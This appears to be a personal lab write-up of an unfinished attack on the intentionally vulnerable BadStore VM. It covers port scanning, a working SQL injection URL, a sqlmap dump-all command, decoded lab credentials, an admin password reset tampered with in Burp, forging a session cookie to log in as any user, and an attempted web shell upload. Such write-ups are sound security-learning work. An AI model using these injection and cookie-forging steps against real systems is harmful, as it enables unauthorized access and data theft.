---
date : 2025-11-08 21:56
aliases : 
  - 
---
# Description
This VM could be downloaded from [vulnhub](https://www.vulnhub.com/entry/badstore-123,41/)

---
# Status Quo
**In Short: Not Rooted, Pending Now**
Time spent : 5hrs

Files can be uploaded by supplier portal, and files can also be created by mysql. However, the created files are without content.
After getting into the VM via virtualbox, and trying to edit those file by nano, I found that disk are full. No new content can be added into `/usr/local`. Details below
```
bash# df
Filesystem     1k-blocks    Used   Available   Use%    Mounted on
/dev/ram0           4049    3931         118    97%    /
/dev/null          16000    4082       11972    25%    /usr
/dev/null          16000   16000           0   100%    /usr/local
/dev/null          16000      88       15912     1%    /home
/dev/null           4092       8        4084     0%    /var
```
In my opinion, it is difficult to establish a shell on this machine. It might be some vulnerabilities of apache or PHP. For many issues, I stop here.

---
# Progress
Here the target is on `10.0.2.15`. Host file was edited to make it be `www.badstore.net`.
## Portscan
Used rustscan. `rustscan -a www.badstore.net -r 1-65535 -b 450 -t 4000 --tries 3 --scan-order random --accessible -- -sC -sV -oA rust_nmap`

Found port 80, 443, 3306 are open.
Let's visit the website, and input something for searching. We found there's likely a sqli.
![[badstore_SQL_statement.png]]

## SQLi
After a simple 1=1 injection, it succeded. Here's the malicious url
http://www.badstore.net/cgi-bin/badstore.cgi?searchquery=%27+or+1%3D1--+&action=search&x=20&y=17
By usnig sqlmap, `sqlmap -u "http://www.badstore.net/cgi-bin/badstore.cgi?searchquery=a&action=search" --random-agent --dump-all --batch -a --output-dir ./sqlmap`, the following info was revealed.
```
banner: '4.1.7-standard'
current user: '@'
current database: 'badstoredb'
current user is DBA: False
```

## Directory Enumeration
After directory enumeration, `/supplier` was found. Then reveals a page `http://www.badstore.net/supplier/accounts` with the following content.
```
1001:am9ldXNlci9wYXNzd29yZC9wbGF0bnVtLzE5Mi4xNjguMTAwLjU2DQo=
1002:a3JvZW1lci9zM0NyM3QvZ29sZC8xMC4xMDAuMTAwLjE=
1003:amFuZXVzZXIvd2FpdGluZzRGcmlkYXkvMTcyLjIyLjEyLjE5
1004:a2Jvb2tvdXQvc2VuZG1lYXBvLzEwLjEwMC4xMDAuMjA=
```
They seems like base64 encoded string. Let's decode.
```
joeuser/password/platnum/192.168.100.56
kroemer/s3Cr3t/gold/10.100.100.1
janeuser/waiting4Friday/172.22.12.19
kbookout/sendmeapo/10.100.100.20
```

## Anonymous Connection
Connect to DB with the following command,`mysql -h www.badstore.net --skip-ssl`.
Using `show databases;` to show all databases. There's only one database named **badstoredb**.

Using `use badstoredb; show tables;` to check all the tables. We found an interesting table called **userdb**. We found admin with password hash and pwdhint. 
## Login as Admin
### Password
Therefore, we can either use the [fogot password function](http://www.badstore.net/cgi-bin/badstore.cgi?action=myaccount) with all the info needed, emali and password hint, or crack the hash.
Here, I reset the password. One might notice there's no option for black. However, we can use burp to give the value whatever we want.
![[badstore_forget_password_request.png]]
The password changed to "Welcome".
### Cookie
One may notice that the cookie, `SSOid`, is in the form of `<user>:<passwordhash>:<fullname>:<role>`. All of these info can be found in userdb. Therefore, we can login as anyone without knowing their actual password by manipulating cookie.
Note: Be careful for the newline in the cookie.
## Upload Files
After changing the password of admin, we can login as admin on the supplier login page.
![[badstore_supplier_portal.png]]
Here, a web shell was already to be uploaded. Next, we need to find the path of that uploaded file. 
Unfortunately, I did not find the path of it. On the virtual machine, the uploaded file is located in `/usr/local/apache/data/uploads`. http://www.badstore.net/data/uploads/shell.php also responded 404.

---
# Recap

---
# Vulnerability
## High
### SQL Injection
http://www.badstore.net/cgi-bin/badstore.cgi?searchquery=%27+or+1%3D1--+&action=search&x=20&y=17
![[badstore_SQLi.png]]

---
# Solving

## Techniques
- [[sql injection MOC|SQLi]]

## Tools
- [[sqlmap]]